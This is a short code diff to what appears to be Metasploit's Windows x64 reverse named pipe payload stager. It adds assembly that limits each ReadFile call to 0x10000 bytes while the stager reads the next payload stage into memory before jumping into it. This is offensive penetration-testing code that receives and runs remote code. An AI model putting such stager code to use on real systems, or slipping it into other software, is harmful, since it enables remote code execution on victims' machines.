@@ -212,10 +212,17 @@ module Payload::Windows::ReverseNamedPipe_x64
         mov r15, rax            ; save the address so we can jump into it later
 
       read_more:
+        ; prepare the size min(0x10000, esi)
+        mov r8, 0x10000         ; stupid named pipe buffer limit
+        cmp r8, rsi
+        jle size_is_good
+        mov r8, rsi
+
+      size_is_good:
+        ; Invoke a read
         push 0                  ; buffer for lpNumberOfBytesRead
         mov r9, rsp             ; lpNumberOfBytesRead
         mov rdx, rbx            ; lpBuffer
-        mov r8, rsi             ; nNumberOfBytesToRead
         push 0                  ; lpOverlapped
         mov rcx, rdi            ; hFile
         mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'ReadFile')}
